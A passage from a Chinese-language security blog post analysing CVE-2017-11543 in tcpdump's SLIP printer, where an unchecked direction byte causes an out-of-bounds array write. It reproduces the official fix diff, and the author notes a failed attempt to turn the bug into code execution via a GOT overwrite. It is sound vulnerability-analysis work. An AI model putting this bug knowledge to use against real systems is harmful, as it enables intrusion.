<span class="n">netdissect</span><span class="p">.</span><span class="nl">h</span><span class="p">:</span><span class="mi">47</span>
<span class="cp">#define SLIPDIR_IN 0
</span><span class="cp">#define SLIPDIR_OUT 1</span></code></pre></td></tr></table>
</div>
</div>
<p>dir(0xe7) 与 SLIPDIR_IN(0) 比较，不相等，于是就把 dir 当成 <code>SLIPDIR_OUT == 1</code> 来处理了。但此时 dir 实际上是 0xe7。</p>

<p>最终执行到 <code>253  lastlen[dir][lastconn] = length - (hlen &lt;&lt; 2);</code> 时，<code>lastlen[dir][lastconn]</code> 访问了不合法的地址，程序 crash。</p>

<h2 id="漏洞修复">漏洞修复</h2>

<p>由上述分析，只需要保证 dir 为 0 或 1 或者其他合法值即可(后来查了一下，分别本机接受的包和本机发送的包)。</p>

<p>官方修复方案如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">diff</span> <span class="o">--</span><span class="n">git</span> <span class="n">a</span><span class="o">/</span><span class="n">print</span><span class="o">-</span><span class="n">sl</span><span class="p">.</span><span class="n">c</span> <span class="n">b</span><span class="o">/</span><span class="n">print</span><span class="o">-</span><span class="n">sl</span><span class="p">.</span><span class="n">c</span>
<span class="n">index</span> <span class="mf">3f</span><span class="n">d7e898</span><span class="p">..</span><span class="n">a02077b3</span> <span class="mi">100644</span>
<span class="o">---</span> <span class="n">a</span><span class="o">/</span><span class="n">print</span><span class="o">-</span><span class="n">sl</span><span class="p">.</span><span class="n">c</span>
<span class="o">+++</span> <span class="n">b</span><span class="o">/</span><span class="n">print</span><span class="o">-</span><span class="n">sl</span><span class="p">.</span><span class="n">c</span>
<span class="err">@@</span> <span class="o">-</span><span class="mi">131</span><span class="p">,</span><span class="mi">8</span> <span class="o">+</span><span class="mi">131</span><span class="p">,</span><span class="mi">21</span> <span class="err">@@</span> <span class="n">sliplink_print</span><span class="p">(</span><span class="n">netdissect_options</span> <span class="o">*</span><span class="n">ndo</span><span class="p">,</span>
        <span class="n">u_int</span> <span class="n">hlen</span><span class="p">;</span>
 
        <span class="n">dir</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">SLX_DIR</span><span class="p">];</span>
<span class="o">-</span>       <span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="n">dir</span> <span class="o">==</span> <span class="n">SLIPDIR_IN</span> <span class="o">?</span> <span class="s">&#34;I &#34;</span> <span class="o">:</span> <span class="s">&#34;O &#34;</span><span class="p">));</span>
<span class="o">+</span>       <span class="k">switch</span> <span class="p">(</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
 
<span class="o">+</span>       <span class="k">case</span> <span class="nl">SLIPDIR_IN</span><span class="p">:</span>
<span class="o">+</span>               <span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;I &#34;</span><span class="p">));</span>
<span class="o">+</span>               <span class="k">break</span><span class="p">;</span>
<span class="o">+</span>
<span class="o">+</span>       <span class="k">case</span> <span class="nl">SLIPDIR_OUT</span><span class="p">:</span>
<span class="o">+</span>               <span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;O &#34;</span><span class="p">));</span>
<span class="o">+</span>               <span class="k">break</span><span class="p">;</span>
<span class="o">+</span>
<span class="o">+</span>       <span class="k">default</span><span class="o">:</span>
<span class="o">+</span>               <span class="n">ND_PRINT</span><span class="p">((</span><span class="n">ndo</span><span class="p">,</span> <span class="s">&#34;Invalid direction %d &#34;</span><span class="p">,</span> <span class="n">dir</span><span class="p">));</span>
<span class="o">+</span>               <span class="n">dir</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="o">+</span>               <span class="k">break</span><span class="p">;</span>
<span class="o">+</span>       <span class="p">}</span>
	<span class="p">......</span></code></pre></td></tr></table>
</div>
</div>
<p>可以看出增加了一个 switch 判断，不合法的全都把 dir 设置为了 -1。</p>

<p>对应的 commit 为 <a href="https://github.com/the-tcpdump-group/tcpdump/commit/378ac56f8055cadda55735b2a786db844d521d24">CVE-2017-11543/Make sure the SLIP direction octet is valid.</a></p>

<h2 id="pwn-掉-tcpdump">pwn 掉 tcpdump？</h2>

<p><del>网上能搜索到的漏洞分析大多数都止步于此，但漏洞描述中说，控制合理的话可以实现 arbitrary code execution，</del></p>

<p><del>&gt; 未完待续</del></p>

<p>想了好几天，只想到通过数组越界写改 got，但又没有找能 leak 的地方，也许是因为打 CTF 太局限对现实漏洞的认识不够吧，如果有大佬能做到代码执行，请务必指教。</p>

<h2 id="reference-and-thanks-to">Reference and thanks to</h2>

<p><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/7.1.1_tcpdump_2017-11543.md">https://github.com/firmianay/CTF-All-In-One/blob/master/doc/7.1.1_tcpdump_2017-11543.md</a></p>

<p><a href="https://vuldb.com/?id.104408">https://vuldb.com/?id.104408</a></p>

<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11543">https://nvd.nist.gov/vuln/detail/CVE-2017-11543</a></p>

<p><a href="https://github.com/google/sanitizers/wiki/AddressSanitizer">https://github.com/google/sanitizers/wiki/AddressSanitizer</a></p>

<p><a href="https://wizardforcel.gitbooks.io/100-gcc-tips/content/address-sanitizer.html">https://wizardforcel.gitbooks.io/100-gcc-tips/content/address-sanitizer.html</a></p>

<p><a href="https://www.zybuluo.com/natsumi/note/80231">https://www.zybuluo.com/natsumi/note/80231</a></p>

<p><a href="https://zh.wikipedia.org/wiki/串列線路網際網路協定">https://zh.wikipedia.org/wiki/串列線路網際網路協定</a></p>

<p><a href="https://tools.ietf.org/html/rfc1055.html">https://tools.ietf.org/html/rfc1055.html</a></p>

<p><a href="https://stackoverflow.com/questions/5497855/what-does-value-optimized-out-mean-in-gdb">https://stackoverflow.com/questions/5497855/what-does-value-optimized-out-mean-in-gdb</a></p>
    </div>

    
    


    
    

    <footer class="post-footer">
      <div class="post-tags">
          <a href="https://bash-c.github.io/tags/cve/">CVE</a>
          
        </div>

      
      <nav class="post-nav">
        
          <a class="prev" href="/post/linux-kernel-pwn-abc-1/">
            
            <i class="iconfont">
              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
</svg>

            </i>
            <span class="prev-text nav-default">Linux Kernel Pwn ABC(Ⅰ)</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        
          <a class="next" href="/post/jarvisoj-pwn-writeup/">
            <span class="next-text nav-default">JarvisOJ Pwn Writeup</span>
            <span class="prev-text nav-mobile">Next</span>
            
            <i class="iconfont">
              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="18" height="18">
  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
</svg>

            </i>
          </a>
      </nav>
    </footer>
  </article>

  
  

  
  

  
  
    <div class="post bg-white">
      <script src="https://utteranc.es/client.js"
            repo= "bash-c/bash-c.github.io"
            issue-term="pathname"
            crossorigin="anonymous"
            async>
      </script>
    </div>
  

  

  

  
  
    



        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="icon-links">
  
  
    <a href="mailto:I_am_M4x@protonmail.com" rel="me noopener" class="iconfont"
      title="email" >
      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
</svg>

    </a>
  
    <a href="http://github.com/bash-c" rel="me noopener" class="iconfont"
      title="github"  target="_blank"
      >
      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="36" height="36">
  <path d="M512 12.672c-282.88 0-512 229.248-512 512 0 226.261333 146.688 418.133333 350.08 485.76 25.6 4.821333 34.986667-11.008 34.986667-24.618667 0-12.16-0.426667-44.373333-0.64-87.04-142.421333 30.890667-172.458667-68.693333-172.458667-68.693333C188.672 770.986667 155.008 755.2 155.008 755.2c-46.378667-31.744 3.584-31.104 3.584-31.104 51.413333 3.584 78.421333 52.736 78.421333 52.736 45.653333 78.293333 119.850667 55.68 149.12 42.581333 4.608-33.109333 17.792-55.68 32.426667-68.48-113.706667-12.8-233.216-56.832-233.216-253.013333 0-55.893333 19.84-101.546667 52.693333-137.386667-5.76-12.928-23.04-64.981333 4.48-135.509333 0 0 42.88-13.738667 140.8 52.48 40.96-11.392 84.48-17.024 128-17.28 43.52 0.256 87.04 5.888 128 17.28 97.28-66.218667 140.16-52.48 140.16-52.48 27.52 70.528 10.24 122.581333 5.12 135.509333 32.64 35.84 52.48 81.493333 52.48 137.386667 0 196.693333-119.68 240-233.6 252.586667 17.92 15.36 34.56 46.762667 34.56 94.72 0 68.522667-0.64 123.562667-0.64 140.202666 0 13.44 8.96 29.44 35.2 24.32C877.44 942.592 1024 750.592 1024 524.672c0-282.752-229.248-512-512-512"></path>
</svg>

    </a>


<a href="https://bash-c.github.io/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
    class="iconfont" title="rss" target="_blank">
    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="30" height="30">
  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
</svg>

  </a>
   
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
       -
    2020
    <span class="heart">
      
      <i class="iconfont">
        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="14" height="14">
  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
   fill="#8a8a8a"></path>
</svg>

      </i>
    </span><span class="author">
        M4x
        
      </span></span>

  
  
    <span id="busuanzi_container">
      访客数/访问量：<span id="busuanzi_value_site_uv"></span>/<span id="busuanzi_value_site_pv"></span>
    </span>
  

  
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont">
        
        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="35" height="35">
  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
</svg>

      </i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>




<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>

  <script type="text/javascript">
    window.MathJax = {
      showProcessingMessages: false,
      messageStyle: 'none'
    };
  </script>
  <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML' async></script>





  
    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
  




  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>










</body>
</html>
